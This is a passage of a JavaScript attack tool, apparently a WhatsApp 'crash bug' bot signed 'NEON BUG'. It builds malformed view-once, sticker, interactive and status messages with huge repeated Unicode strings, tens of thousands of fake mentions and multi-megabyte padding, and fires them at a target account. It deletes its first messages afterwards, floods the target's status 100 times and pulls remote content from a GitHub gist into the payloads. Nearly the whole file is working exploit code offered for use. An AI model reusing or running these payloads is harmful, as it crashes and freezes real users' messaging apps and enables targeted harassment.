    url: 'https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true',
    mimetype: 'video/mp4',
    fileSha256: '9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=',
    fileLength: '999999',
    seconds: 999999,
    mediaKey: 'JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=',
    caption: ' ',
    height: 999999,
    width: 999999,
    fileEncSha256: 'HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=',
    directPath: '/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0',
    mediaKeyTimestamp: '1743742853',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        title: 'KIMOCHI',
        body: `${'\u0000'.repeat(9117)}`,
        mediaType: 1,
        renderLargerThumbnail: true,
        thumbnailUrl: null,
        sourceUrl: `https://${'ꦾ'.repeat(100)}.com/`
      },
      businessMessageForwardInfo: { businessOwnerJid: target },
      quotedMessage,
      isSampled: true,
      mentionedJid: mentionedList
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363331859075083@newsletter',
      serverMessageId: 1,
      newsletterName: `${'ꦾ'.repeat(100)}`
    },
    streamingSidecar: 'cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=',
    thumbnailDirectPath: '/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0',
    thumbnailSha256: 'QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=',
    thumbnailEncSha256: 'fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k='
  };

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: { videoMessage }
    }
  }, {});

  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: 'meta',
        attrs: {},
        content: [
          {
            tag: 'mentioned_users',
            attrs: {},
            content: [
              { tag: 'to', attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: { key: msg.key, type: 25 }
        }
      }
    }, {
      additionalNodes: [
        { tag: 'meta', attrs: { is_status_mention: 'true' }, content: undefined }
      ]
    });
  }
}

// ── protocolbug3 (neon-android wave 3) ──
async function _protocolbug3(sock, target, mention = true) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: 'https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true',
          mimetype: 'video/mp4',
          fileSha256: '9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=',
          fileLength: '999999',
          seconds: 999999,
          mediaKey: 'JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=',
          caption: '\u9999',
          height: 999999,
          width: 999999,
          fileEncSha256: 'HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=',
          directPath: '/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0',
          mediaKeyTimestamp: '1743742853',
          contextInfo: {
            isSampled: true,
            mentionedJid: [
              '13135550002@s.whatsapp.net',
              ...Array.from({ length: 30000 }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ]
          },
          streamingSidecar: 'Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=',
          thumbnailDirectPath: '/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0',
          thumbnailSha256: 'vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=',
          thumbnailEncSha256: 'dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE='
        }
      }
    }
  }, {});

  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: 'meta',
        attrs: {},
        content: [
          {
            tag: 'mentioned_users',
            attrs: {},
            content: [
              { tag: 'to', attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: { key: msg.key, type: 25 }
        }
      }
    }, {
      additionalNodes: [
        { tag: 'meta', attrs: { is_status_mention: 'true' }, content: undefined }
      ]
    });
  }
}

// ── NativeXFcWithDozerX (neon-freeze wave 1) ──
async function _nativeXFcWithDozerX(sock, target) {
  const delayMs = ms => new Promise(res => setTimeout(res, ms));
  const SID = '5e03e0&mms3';
  const key = '10000000_2012297619515179_5714769099548640934_n.enc';
  const type = 'image/webp';

  const generateLargeString = (sizeInBytes) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < sizeInBytes; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    return result;
  };
  const extraPayload = generateLargeString(8.5 * 1024 * 1024);

  let apiClient;
  try {
    const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
    apiClient = await res.text();
  } catch (err) {
    console.error('[_nativeXFcWithDozerX] API fetch failed:', err.message);
    apiClient = '{}';
  }

  const xNativeRiepers = JSON.stringify({ status: true, criador: 'VerloadXx', resultado: { type: 'md', ws: { _events: { 'CB:ib,,dirty': ['Array'] }, _eventsCount: 800000, _maxListeners: 0, url: 'wss://web.whatsapp.com/ws/chat', config: { version: ['Array'], browser: ['Array'], waWebSocketUrl: 'wss://web.whatsapp.com/ws/chat', sockCectTimeoutMs: 20000, keepAliveIntervalMs: 30000, logger: {}, printQRInTerminal: false, emitOwnEvents: true, defaultQueryTimeoutMs: 60000, customUploadHosts: [], retryRequestDelayMs: 250, maxMsgRetryCount: 5, fireInitQueries: true, auth: { Object: 'authData' }, markOnlineOnsockCect: true, syncFullHistory: true, linkPreviewImageThumbnailWidth: 192, transactionOpts: { Object: 'transactionOptsData' }, generateHighQualityLinkPreview: false, options: {}, appStateMacVerification: { Object: 'appStateMacData' }, mobile: true } } } });

  const msg1 = generateWAMessageFromContent(target, {
    ephemeralMessage: {
      quotedMessage: {
        extendedTextMessage: {
          text: '༽ 𝖃𝕭𝕷𝕬𝕾𝕿𝕰𝕽 ༼' + 'ោ៝'.repeat(10000),
          title: '༽ 𝕱𝕺𝕸𝕺 ༼`',
          description: 'NEON BUG' + xNativeRiepers,
          canonicalUrl: 'https://t.me/neonbug',
          previewType: 'PHOTO',
          jpegTumbnail: Buffer.from([104, 123, 111, 89, 53, 172, 222, 200, 203, 217, 189, 190, 134, 225]),
          contextInfo: {
            mentionedJid: ['0@s.whatsapp.net'],
            isForwarded: true
          }
        }
      }
    }
  }, {});

  const msg2 = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      nativeFlowMessage: {
        messageParamsJson: '(['.repeat(15000),
        buttons: [
          { name: 'galaxy_message',          buttonParamsJson: 'ꦽ' + '𑅂𑘵𑘴𑘿'.repeat(10000) },
          { name: 'single_select',           buttonParamsJson: 'ោ៝'.repeat(10000) },
          { name: 'call_permission_request', buttonParamsJson: JSON.stringify({ status: true }) },
          { name: 'mpm',                     buttonParamsJson: xNativeRiepers },
          { name: 'cta_call',                buttonParamsJson: 'ॏ'.repeat(12309) }
        ]
      }
    }
  }, {});

  const msg3 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        nativeFlowMessage: {
          buttons: [
            { name: 'single_select',           buttonParamJson: '' },
            { name: 'call_permission_request', buttonParamJson: JSON.stringify({ status: true }) }
          ],
          messageParamsJson: '{{'.repeat(10000)
        }
      }
    }
  }, {});

  const videoCrash = {
    videoMessage: {
      url: 'https://example.com/fake.mp4',
      mimetype: 'video/mp4',
      caption: '꧔꧈'.repeat(15000),
      fileSha256: Buffer.from('00', 'hex'),
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: Buffer.from('00', 'hex'),
      fileEncSha256: Buffer.from('00', 'hex'),
      directPath: '/v/t62.7118-24/...',
      mediaKeyTimestamp: 999999999,
      jpegThumbnail: Buffer.from('00', 'hex'),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: '꧔꧈',
          body: '꧔꧈',
          thumbnail: Buffer.from('00', 'hex'),
          mediaType: 1,
          renderLargerThumbnail: true,
          showAdAttribution: true
        }
      }
    }
  };

  const bulldozerMessage = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
          fileSha256: 'n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=',
          fileEncSha256: 'zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=',
          mediaKey: 'ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=',
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
          fileLength: { low: 999999, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Date.now() % 2147483647, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: 'KN4kQ5pyABRAgA==',
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: ['0@s.whatsapp.net'],
            entryPointConversionSource: 'non_contact',
            entryPointConversionApp: 'whatsapp',
            entryPointConversionDelaySeconds: 999999
          },
          stickerSentTs: { low: -10000000, high: 999, unsigned: false },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          extraPayload
        }
      }
    }
  }, {});

  const msgForce = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast',
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: '\n\n',
              newsletterJid: '120363321780343299@newsletter',
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: '? NEON BUG',
              body: '',
              sourceUrl: '${DEVELOPER_LINK}',
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: { businessOwnerJid: target },
            dataSharingContext: { showMmDisclosure: true },
            quotedMessage: {
              paymentInviteMessage: { serviceType: 1, expiryTimestamp: null }
            }
          },
          header: { title: '', hasMediaAttachment: false },
          body: { text: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮' },
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              name: 'galaxy_message',
              title: 'galaxy_message',
              header: 'NEON BUG',
              body: 'Call Galaxy'
            }),
            buttons: [
              { name: 'single_select',           buttonParamsJson: apiClient + 'NEON BUG' },
              { name: 'call_permission_request', buttonParamsJson: apiClient + '?NEON BUG' },
              { name: 'payment_method',          buttonParamsJson: '' },
              { name: 'payment_status',          buttonParamsJson: '' },
              { name: 'review_order',            buttonParamsJson: '' }
            ]
          }
        }
      }
    }
  }, {});

  const pret2 = await sock.relayMessage(target, msg1, {
    messageId: generateMessageID(),
    userJid: target
  });
  await delayMs(1500);

  const pret1 = await sock.relayMessage(target, msg2, {
    messageId: generateMessageID(),
    userJid: target
  });
  await delayMs(1500);

  const pret3 = await sock.relayMessage(target, msg3, {
    messageId: generateMessageID(),
    userJid: target
  });
  await delayMs(2000);

  await Promise.all([
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: pret1.key.id } }),
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: pret2.key.id } }),
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: pret3.key.id } }),
  ]);

  await delayMs(1500);

  await sock.relayMessage(target, videoCrash, {
    messageId: generateMessageID(),
    userJid: target
  });
  await delayMs(2000);

  await sock.relayMessage(target, msgForce.message, {
    participant: { jid: target },
    messageId: msgForce.key.id
  });
  await delayMs(1500);

  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: 'ꦾ'.repeat(20000) + '@1'.repeat(20000),
      contextInfo: {
        stanzaId: target,
        participant: target,
        quotedMessage: {
          conversation:
            '〽️ ɴeon 〽️' +
            'ꦾ࣯'.repeat(50000) +
            '@1'.repeat(20000)
        },
        disappearingMode: {
          initiator: 'CHANGED_IN_CHAT',
          trigger: 'CHAT_SETTING'
        }
      },
      inviteLinkGroupTypeV2: 'DEFAULT'
    }
  }, { participant: { jid: target } });

  await delayMs(2000);

  for (let i = 0; i < 100; i++) {
    await sock.relayMessage('status@broadcast', bulldozerMessage.message, {
      messageId: bulldozerMessage.key.id,
      statusJidList: [target]
    });
    await delayMs(100);
  }
}

// ── BetaTester (neon-freeze wave 2) ──
async function _betaTester(sock, target, mention = true) {
  const mentionList = Array.from({ length: 2000 }, (_, d) => `1313555000${d + 1}@s.whatsapp.net`);
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: { messageSecret: crypto.randomBytes(32) },
        interactiveResponseMessage: {
          body: { text: 'NEON BUG' },
          nativeFlowResponseMessage: { name: 'galaxy_message', paramsJson: '\u0003'.repeat(5000), version: 3 },
          contextInfo: {
            isChannelMessage: true,
            mentionedJid: mentionList,
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: { newsletterName: '.¿', newsletterJid: '25002008@newsletter', serverMessageId: 1 }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: 'meta',
        attrs: {},
        content: [
          {
            tag: 'mentioned_users',
            attrs: {},
            content: [
              { tag: 'to', attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: { key: msg.key, type: 25 }
        }
      }
    }, {
      additionalNodes: [
        { tag: 'meta', attrs: { is_status_mention: 'NEON BUG' }, content: undefined }
      ]
    });
  }
}

// ============================================
// END OF NEON.JS
// 「☠︎」NEON BUG - HIMSELF
// CREATED BY NEON BUG ☠️
// ============================================
